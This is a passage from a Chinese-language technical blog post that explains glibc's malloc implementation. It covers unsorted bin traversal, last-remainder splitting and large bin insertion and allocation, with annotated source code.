此外，在实践中，程序往往会有连续的小内存请求或大内存请求的运行，</span></span><br><span class="line"><span class="comment">   但很少有混合请求，因此在大多数程序中不经常调用合并操作。</span></span><br><span class="line"><span class="comment">   而对于频繁调用合并操作的程序，通常会发生碎片化问题。</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// 获取large bin的下标。</span></span><br><span class="line">        idx = largebin_index(nb);</span><br><span class="line">        <span class="comment">// 如果存在fastbin的话，会处理 fastbin</span></span><br><span class="line">        <span class="keyword">if</span> (have_fastchunks(av)) malloc_consolidate(av);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p><strong>bk是前驱节点，fd是后继节点，别记错了咩</strong></p><h5 id="大循环-遍历-unsorted-bin"><a href="#大循环-遍历-unsorted-bin" class="headerlink" title="大循环 - 遍历 unsorted bin"></a>大循环 - 遍历 unsorted bin</h5><p><strong>如果程序执行到了这里，那么说明 与 chunk 大小正好一致的 bin (fast bin， small bin) 中没有 chunk 可以直接满足需求 ，但是 large chunk 则是在这个大循环中处理</strong>。</p><p>在接下来的这个循环中，主要做了以下的操作</p><ul><li>按照 FIFO 的方式逐个将 unsorted bin 中的 chunk 取出来<ul><li>如果是 small request，则考虑是不是恰好满足，是的话，直接返回。</li><li>如果不是的话，放到对应的 bin 中。</li></ul></li><li>尝试从 large bin 中分配用户所需的内存</li></ul><p>该部分是一个大循环，这是<strong>为了尝试重新分配 small bin chunk</strong>，这是因为我们虽然会首先使用 large bin，top chunk 来尝试满足用户的请求，但是如果没有满足的话，由于我们在上面没有分配成功 small bin，我们并没有对 fast bin 中的 chunk 进行合并，所以<strong>这里会进行 fast bin chunk 的合并</strong>，进而<strong>使用一个大循环来尝试再次分配 small bin chunk</strong>。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">       Process recently freed or remaindered chunks, taking one only if</span></span><br><span class="line"><span class="comment">       it is exact fit, or, if this a small request, the chunk is remainder from</span></span><br><span class="line"><span class="comment">       the most recent non-exact fit.  Place other traversed chunks in</span></span><br><span class="line"><span class="comment">       bins.  Note that this step is the only place in any routine where</span></span><br><span class="line"><span class="comment">       chunks are placed in bins.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">       The outer loop here is needed because we might not realize until</span></span><br><span class="line"><span class="comment">       near the end of malloc that we should have consolidated, so must</span></span><br><span class="line"><span class="comment">       do so and retry. This happens at most once, and only when we would</span></span><br><span class="line"><span class="comment">       otherwise need to expand memory to service a &quot;small&quot; request.</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">   处理最近释放或剩余的内存块，只有在精确匹配时才取一个块，或者如果这是一个小的请求，并且该块是最近一个非精确匹配的剩余块。将其他经过遍历的块放入 bins 中。请注意，这一步是任何例程中唯一将块放入 bins 中的地方。</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">   外部循环在这里是必需的，因为直到接近 malloc 的末尾，我们可能才意识到应该进行合并，所以必须这样做并重试。这最多发生一次，仅当我们否则需要扩展内存来处理一个 &quot;小&quot; 请求时。</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line">    <span class="keyword">for</span> (;;) &#123;</span><br><span class="line">        <span class="type">int</span> iters = <span class="number">0</span>;</span><br></pre></td></tr></table></figure><h5 id="unsorted-bin-遍历"><a href="#unsorted-bin-遍历" class="headerlink" title="unsorted bin 遍历"></a>unsorted bin 遍历</h5><p><strong>先考虑 unsorted bin</strong>，<strong>再考虑 last remainder</strong>(是最近一次非精确匹配的剩余块) ，但是对于 small bin chunk 的请求会有所例外。</p><p><strong>注意 unsorted bin 的遍历顺序为 bk。</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 如果 unsorted bin 不为空</span></span><br><span class="line"><span class="comment">// First In First Out</span></span><br><span class="line"><span class="keyword">while</span> ((victim = unsorted_chunks(av)-&gt;bk) != unsorted_chunks(av)) &#123;</span><br><span class="line">    <span class="comment">// victim 为 unsorted bin 的最后一个 chunk</span></span><br><span class="line">    <span class="comment">// bck 为 unsorted bin 的倒数第二个 chunk</span></span><br><span class="line">    bck = victim-&gt;bk;</span><br><span class="line">    <span class="comment">// 判断得到的 chunk 是否满足要求，不能过小，也不能过大</span></span><br><span class="line">    <span class="comment">// 一般 system_mem 的大小为132K</span></span><br><span class="line">    <span class="keyword">if</span> (__builtin_expect(chunksize_nomask(victim) &lt;= <span class="number">2</span> * SIZE_SZ, <span class="number">0</span>) ||</span><br><span class="line">        __builtin_expect(chunksize_nomask(victim) &gt; av-&gt;system_mem, <span class="number">0</span>))</span><br><span class="line">        malloc_printerr(check_action, <span class="string">&quot;malloc(): memory corruption&quot;</span>,</span><br><span class="line">                        chunk2mem(victim), av);</span><br><span class="line">    <span class="comment">// 得到victim对应的chunk大小。</span></span><br><span class="line">    size = chunksize(victim);</span><br></pre></td></tr></table></figure><h5 id="SMALL-REQUEST"><a href="#SMALL-REQUEST" class="headerlink" title="SMALL REQUEST"></a>SMALL REQUEST</h5><p>如果用户的请求为 small bin chunk，那么我们首先考虑 last remainder，如果 last remainder 是 unsorted bin 中的唯一一块的话， 并且 last remainder 的大小分割后还可以作为一个 chunk ，<strong>为什么没有等号</strong>？</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line">        <span class="comment">/*</span></span><br><span class="line"><span class="comment">           If a small request, try to use last remainder if it is the</span></span><br><span class="line"><span class="comment">           only chunk in unsorted bin.  This helps promote locality for</span></span><br><span class="line"><span class="comment">           runs of consecutive small requests. This is the only</span></span><br><span class="line"><span class="comment">           exception to best-fit, and applies only when there is</span></span><br><span class="line"><span class="comment">           no exact fit for a small chunk.</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">如果是一个小的内存请求，如果未排序的 bin 中只有一个块，并且它是上一个剩余块，尝试使用它。</span></span><br><span class="line"><span class="comment">这有助于提高连续小内存请求的局部性。这是对最佳适配算法的唯一例外，仅适用于没有完全匹配的小块。</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (in_smallbin_range(nb) &amp;&amp; bck == unsorted_chunks(av) &amp;&amp;victim == av-&gt;last_remainder &amp;&amp;(<span class="type">unsigned</span> <span class="type">long</span>) (size) &gt; (<span class="type">unsigned</span> <span class="type">long</span>) (nb + MINSIZE)) </span><br><span class="line">        &#123;</span><br><span class="line">            <span class="comment">/* split and reattach remainder */</span></span><br><span class="line">            <span class="comment">// 获取新的 remainder 的大小</span></span><br><span class="line">            remainder_size          = size - nb;</span><br><span class="line">            <span class="comment">// 获取新的 remainder 的位置</span></span><br><span class="line">            remainder               = chunk_at_offset(victim, nb);</span><br><span class="line">            <span class="comment">// 更新 unsorted bin 的情况</span></span><br><span class="line">            unsorted_chunks(av)-&gt;bk = unsorted_chunks(av)-&gt;fd = remainder;</span><br><span class="line">            <span class="comment">// 更新 av 中记录的 last_remainder</span></span><br><span class="line">            av-&gt;last_remainder                                = remainder;</span><br><span class="line">            <span class="comment">// 更新last remainder的指针</span></span><br><span class="line">            remainder-&gt;bk = remainder-&gt;fd = unsorted_chunks(av);</span><br><span class="line">            <span class="keyword">if</span> (!in_smallbin_range(remainder_size)) &#123;</span><br><span class="line">                remainder-&gt;fd_nextsize = <span class="literal">NULL</span>;</span><br><span class="line">                remainder-&gt;bk_nextsize = <span class="literal">NULL</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">// 设置victim的头部，</span></span><br><span class="line">            set_head(victim, nb | PREV_INUSE |</span><br><span class="line">                                 (av != &amp;main_arena ? NON_MAIN_ARENA : <span class="number">0</span>));</span><br><span class="line">            <span class="comment">// 设置 remainder 的头部</span></span><br><span class="line">            set_head(remainder, remainder_size | PREV_INUSE);</span><br><span class="line">            <span class="comment">// 设置记录 remainder 大小的 prev_size 字段，因为此时 remainder 处于空闲状态。</span></span><br><span class="line">            set_foot(remainder, remainder_size);</span><br><span class="line">            <span class="comment">// 细致的检查，非调试状态下没有作用</span></span><br><span class="line">            check_malloced_chunk(av, victim, nb);</span><br><span class="line">            <span class="comment">// 将 victim 从 chunk 模式转化为mem模式</span></span><br><span class="line">            <span class="type">void</span> *p = chunk2mem(victim);</span><br><span class="line">            <span class="comment">// 如果设置了perturb_type, 则将获取到的chunk初始化为 perturb_type ^ 0xff</span></span><br><span class="line">            alloc_perturb(p, bytes);</span><br><span class="line">            <span class="keyword">return</span> p;</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure><h5 id="初始取出"><a href="#初始取出" class="headerlink" title="初始取出"></a>初始取出</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* remove from unsorted list */</span></span><br><span class="line">unsorted_chunks(av)-&gt;bk = bck;</span><br><span class="line">bck-&gt;fd                 = unsorted_chunks(av);</span><br></pre></td></tr></table></figure><h5 id="EXACT-FIT"><a href="#EXACT-FIT" class="headerlink" title="EXACT FIT"></a>EXACT FIT</h5><p>如果从 unsorted bin 中取出来的 chunk 大小正好合适，就直接使用。这里应该已经把合并后恰好合适的 chunk 给分配出去了。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Take now instead of binning if exact fit */</span></span><br><span class="line"><span class="keyword">if</span> (size == nb) &#123;</span><br><span class="line">    set_inuse_bit_at_offset(victim, size);</span><br><span class="line">    <span class="keyword">if</span> (av != &amp;main_arena) set_non_main_arena(victim);</span><br><span class="line">    check_malloced_chunk(av, victim, nb);</span><br><span class="line">    <span class="type">void</span> *p = chunk2mem(victim);</span><br><span class="line">    alloc_perturb(p, bytes);</span><br><span class="line">    <span class="keyword">return</span> p;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h5 id="PLACE-CHUNK-IN-SMALL-BIN"><a href="#PLACE-CHUNK-IN-SMALL-BIN" class="headerlink" title="PLACE CHUNK IN SMALL BIN"></a>PLACE CHUNK IN SMALL BIN</h5><p>把取出来的 chunk 放到对应的 small bin 中。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* place chunk in bin */</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (in_smallbin_range(size)) &#123;</span><br><span class="line">    victim_index = smallbin_index(size);</span><br><span class="line">    bck          = bin_at(av, victim_index);</span><br><span class="line">    fwd          = bck-&gt;fd;</span><br></pre></td></tr></table></figure><h5 id="PLACE-CHUNK-IN-LARGE-BIN"><a href="#PLACE-CHUNK-IN-LARGE-BIN" class="headerlink" title="PLACE CHUNK IN LARGE BIN"></a>PLACE CHUNK IN LARGE BIN</h5><p>把取出来的 chunk 放到对应的 large bin 中。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="comment">// large bin 范围</span></span><br><span class="line">    victim_index = largebin_index(size);</span><br><span class="line">    bck          = bin_at(av, victim_index); <span class="comment">// 当前 large bin 的头部</span></span><br><span class="line">    fwd          = bck-&gt;fd;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* maintain large bins in sorted order */</span></span><br><span class="line">    <span class="comment">/* 从这里我们可以总结出，largebin 以 fd_nextsize 递减排序。</span></span><br><span class="line"><span class="comment">       同样大小的 chunk，后来的只会插入到之前同样大小的 chunk 后，</span></span><br><span class="line"><span class="comment">       而不会修改之前相同大小的fd/bk_nextsize，这也很容易理解，</span></span><br><span class="line"><span class="comment">       可以减低开销。此外，bin 头不参与 nextsize 链接。*/</span></span><br><span class="line">    <span class="comment">// 如果 large bin 链表不空</span></span><br><span class="line">    <span class="keyword">if</span> (fwd != bck) &#123;</span><br><span class="line">        <span class="comment">/* Or with inuse bit to speed comparisons */</span></span><br><span class="line">        <span class="comment">// 加速比较，应该不仅仅有这个考虑，因为链表里的 chunk 都会设置该位。</span></span><br><span class="line">        size |= PREV_INUSE;</span><br><span class="line">        <span class="comment">/* if smaller than smallest, bypass loop below */</span></span><br><span class="line">        <span class="comment">// bck-&gt;bk 存储着相应 large bin 中最小的chunk。</span></span><br><span class="line">        <span class="comment">// 如果遍历的 chunk 比当前最小的还要小，那就只需要插入到链表尾部。</span></span><br><span class="line">        <span class="comment">// 判断 bck-&gt;bk 是不是在 main arena。</span></span><br><span class="line">      assert ((bck-&gt;bk-&gt;size &amp; NON_MAIN_ARENA) == <span class="number">0</span>);</span><br><span class="line">        <span class="keyword">if</span> ((<span class="type">unsigned</span> <span class="type">long</span>) (size) &lt;</span><br><span class="line">            (<span class="type">unsigned</span> <span class="type">long</span>) chunksize_nomask(bck-&gt;bk)) &#123;</span><br><span class="line">            <span class="comment">// 令 fwd 指向 large bin 头</span></span><br><span class="line">            fwd = bck;</span><br><span class="line">            <span class="comment">// 令 bck 指向 largin bin 尾部 chunk</span></span><br><span class="line">            bck = bck-&gt;bk;</span><br><span class="line">            <span class="comment">// victim 的 fd_nextsize 指向 largin bin 的第一个 chunk</span></span><br><span class="line">            victim-&gt;fd_nextsize = fwd-&gt;fd;</span><br><span class="line">            <span class="comment">// victim 的 bk_nextsize 指向原来链表的第一个 chunk 指向的 bk_nextsize</span></span><br><span class="line">            victim-&gt;bk_nextsize = fwd-&gt;fd-&gt;bk_nextsize;</span><br><span class="line">            <span class="comment">// 原来链表的第一个 chunk 的 bk_nextsize 指向 victim</span></span><br><span class="line">            <span class="comment">// 原来指向链表第一个 chunk 的 fd_nextsize 指向 victim</span></span><br><span class="line">            fwd-&gt;fd-&gt;bk_nextsize =</span><br><span class="line">                victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="comment">// 当前要插入的 victim 的大小大于最小的 chunk</span></span><br><span class="line">            <span class="comment">// 判断 fwd 是否在 main arena</span></span><br><span class="line">            assert(chunk_main_arena(fwd));</span><br><span class="line">            <span class="comment">// 从链表头部开始找到不比 victim 大的 chunk</span></span><br><span class="line">            <span class="keyword">while</span> ((<span class="type">unsigned</span> <span class="type">long</span>) size &lt; chunksize_nomask(fwd)) &#123;</span><br><span class="line">                fwd = fwd-&gt;fd_nextsize;</span><br><span class="line">                assert(chunk_main_arena(fwd));</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">// 如果找到了一个和 victim 一样大的 chunk，</span></span><br><span class="line">            <span class="comment">// 那就直接将 chunk 插入到该chunk的后面，并不修改 nextsize 指针。</span></span><br><span class="line">            <span class="keyword">if</span> ((<span class="type">unsigned</span> <span class="type">long</span>) size ==</span><br><span class="line">                (<span class="type">unsigned</span> <span class="type">long</span>) chunksize_nomask(fwd))</span><br><span class="line">                <span class="comment">/* Always insert in the second position.  */</span></span><br><span class="line">                fwd = fwd-&gt;fd;</span><br><span class="line">            <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="comment">// 如果找到的chunk和当前victim大小不一样</span></span><br><span class="line">                <span class="comment">// 那么就需要构造 nextsize 双向链表了</span></span><br><span class="line">                victim-&gt;fd_nextsize              = fwd;</span><br><span class="line">                victim-&gt;bk_nextsize              = fwd-&gt;bk_nextsize;</span><br><span class="line">                fwd-&gt;bk_nextsize                 = victim;</span><br><span class="line">                victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;</span><br><span class="line">            &#125;</span><br><span class="line">            bck = fwd-&gt;bk;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span></span><br><span class="line">        <span class="comment">// 如果空的话，直接简单使得 fd_nextsize 与 bk_nextsize 构成一个双向链表即可。</span></span><br><span class="line">        victim-&gt;fd_nextsize = victim-&gt;bk_nextsize = victim;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h5 id="最终取出"><a href="#最终取出" class="headerlink" title="最终取出"></a>最终取出</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 放到对应的 bin 中，构成 bck&lt;--&gt;victim&lt;--&gt;fwd。</span></span><br><span class="line">mark_bin(av, victim_index);</span><br><span class="line">victim-&gt;bk = bck;</span><br><span class="line">victim-&gt;fd = fwd;</span><br><span class="line">fwd-&gt;bk    = victim;</span><br><span class="line">bck-&gt;fd    = victim;</span><br></pre></td></tr></table></figure><h5 id="WHILE-迭代次数"><a href="#WHILE-迭代次数" class="headerlink" title="WHILE 迭代次数"></a>WHILE 迭代次数</h5><p>while 最多迭代 10000 次后退出。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">    <span class="comment">// #define MAX_ITERS 10000</span></span><br><span class="line">    <span class="keyword">if</span> (++iters &gt;= MAX_ITERS) <span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h5 id="large-chunk"><a href="#large-chunk" class="headerlink" title="large chunk"></a>large chunk</h5><p><strong>注： 或许会很奇怪，为什么这里没有先去看 small chunk 是否满足新需求了呢？这是因为 small bin 在循环之前已经判断过了，这里如果有的话，就是合并后的才出现 chunk。但是在大循环外，large chunk 只是单纯地找到其索引，所以觉得在这里直接先判断是合理的，而且也为了下面可以再去找较大的 chunk。</strong></p><p>如果请求的 chunk 在 large chunk 范围内，就在对应的 bin 中从小到大进行扫描，找到第一个合适的。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">   If a large request, scan through the chunks of current bin in</span></span><br><span class="line"><span class="comment">   sorted order to find smallest that fits.  Use the skip list for this.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">if</span> (!in_smallbin_range(nb)) &#123;</span><br><span class="line">    bin = bin_at(av, idx);</span><br><span class="line">    <span class="comment">/* skip scan if empty or largest chunk is too small */</span></span><br><span class="line">    <span class="comment">// 如果对应的 bin 为空或者其中的chunk最大的也很小，那就跳过</span></span><br><span class="line">    <span class="comment">// first(bin)=bin-&gt;fd 表示当前链表中最大的chunk//双向链表的首部是最大的</span></span><br><span class="line">    <span class="keyword">if</span> ((victim = first(bin)) != bin &amp;&amp;</span><br><span class="line">        (<span class="type">unsigned</span> <span class="type">long</span>) chunksize_nomask(victim) &gt;=</span><br><span class="line">            (<span class="type">unsigned</span> <span class="type">long</span>) (nb)) &#123;</span><br><span class="line">        <span class="comment">// 反向遍历链表，直到找到第一个不小于所需chunk大小的chunk</span></span><br><span class="line">        victim = victim-&gt;bk_nextsize;</span><br><span class="line">        <span class="keyword">while</span> (((<span class="type">unsigned</span> <span class="type">long</span>) (size = chunksize(victim)) &lt;(<span class="type">unsigned</span> <span class="type">long</span>) (nb)))</span><br><span class="line">            victim = victim-&gt;bk_nextsize;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* Avoid removing the first entry for a size so that the skip</span></span><br><span class="line"><span class="comment">           list does not have to be rerouted.  */</span></span><br><span class="line">        <span class="comment">// 如果最终取到的chunk不是该bin中的最后一个chunk，并且该chunk与其前面的chunk</span></span><br><span class="line">        <span class="comment">// 的大小相同，那么我们就取其前面的chunk，这样可以避免调整bk_nextsize,fd_nextsize</span></span><br><span class="line">        <span class="comment">//  链表。因为大小相同的chunk只有一个会被串在nextsize链上。</span></span><br><span class="line">        <span class="keyword">if</span> (victim != last(bin) &amp;&amp;</span><br><span class="line">            chunksize_nomask(victim) == chunksize_nomask(victim-&gt;fd))</span><br><span class="line">            victim = victim-&gt;fd;</span><br><span class="line">        <span class="comment">// 计算分配后剩余的大小</span></span><br><span class="line">        remainder_size = size - nb;</span><br><span class="line">        <span class="comment">// 进行unlink</span></span><br><span class="line">        unlink(av, victim, bck, fwd);</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* Exhaust */</span></span><br><span class="line">        <span class="comment">// 剩下的大小不足以当做一个块</span></span><br><span class="line">        <span class="comment">// 很好奇接下来会怎么办？</span></span><br><span class="line">        <span class="keyword">if</span> (remainder_size &lt; MINSIZE) &#123;</span><br><span class="line">            set_inuse_bit_at_offset(victim, size);</span><br><span class="line">            <span class="keyword">if</span> (av != &amp;main_arena)      set_non_main_arena(victim);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">/* Split */</span></span><br><span class="line">        <span class="comment">//  剩下的大小还可以作为一个chunk，进行分割。</span></span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="comment">// 获取剩下那部分chunk的指针，称为remainder</span></span><br><span class="line">            remainder = chunk_at_offset(victim, nb);</span><br><span class="line">            <span class="comment">/* We cannot assume the unsorted list is empty and therefore</span></span><br><span class="line"><span class="comment">               have to perform a complete insert here.  */</span></span><br><span class="line">            <span class="comment">// 插入unsorted bin中</span></span><br><span class="line">            bck = unsorted_chunks(av);</span><br><span class="line">            fwd = bck-&gt;fd;</span><br><span class="line">            <span class="comment">// 判断 unsorted bin 是否被破坏。</span></span><br><span class="line">            <span class="keyword">if</span> (__glibc_unlikely(fwd-&gt;bk != bck)) &#123;</span><br><span class="line">                errstr = <span class="string">&quot;malloc(): corrupted unsorted chunks&quot;</span>;</span><br><span class="line">                <span class="keyword">goto</span> errout;</span><br><span class="line">            &#125;</span><br><span class="line">            remainder-&gt;bk = bck;</span><br><span class="line">            remainder-&gt;fd = fwd;</span><br><span class="line">            bck-&gt;fd       = remainder;</span><br><span class="line">            fwd-&gt;bk       = remainder;</span><br><span class="line">            <span class="comment">// 如果不处于small bin范围内，就设置对应的字段</span></span><br><span class="line">            <span class="keyword">if</span> (!in_smallbin_range(remainder_size)) &#123;</span><br><span class="line">                remainder-&gt;fd_nextsize = <span class="literal">NULL</span>;</span><br><span class="line">                remainder-&gt;bk_nextsize = <span class="literal">NULL</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">// 设置分配的chunk的标记</span></span><br><span class="line">            set_head(victim,</span><br><span class="line">                     nb | PREV_INUSE |</span><br><span class="line">                         (av != &amp;main_arena ? NON_MAIN_ARENA : <span class="number">0</span>));</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 设置remainder的上一个chunk，即分配出去的chunk的使用状态</span></span><br><span class="line">            <span class="comment">// 其余的不用管，直接从上面继承下来了</span></span><br><span class="line">            set_head(remainder, remainder_size | PREV_INUSE);</span><br><span class="line">            <span class="comment">// 设置remainder的大小</span></span><br><span class="line">            set_foot(remainder, remainder_size);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 检查</span></span><br><span class="line">        check_malloced_chunk(av, victim, nb);</span><br><span class="line">        <span class="comment">// 转换为mem状态</span></span><br><span class="line">        <span class="type">void</span> *p = chunk2mem(victim);</span><br><span class="line">        <span class="comment">// 如果设置了perturb_type, 则将获取到的chunk初始化为 perturb_type ^ 0xff</span></span><br><span class="line">        alloc_perturb(p, bytes);</span><br><span class="line">        <span class="keyword">return</span> p;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h5 id="寻找较大-chunk"><a href="#寻找较大-chunk" class="headerlink" title="寻找较大 chunk"></a>寻找较大 chunk</h5><p>如果走到了这里，那说明对于用户所需的 chunk，不能直接从其对应的合适的 bin 中获取 chunk，所以我们需要来查找比当前 bin 更大的 fast bin ， small bin 或者 large bin。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td 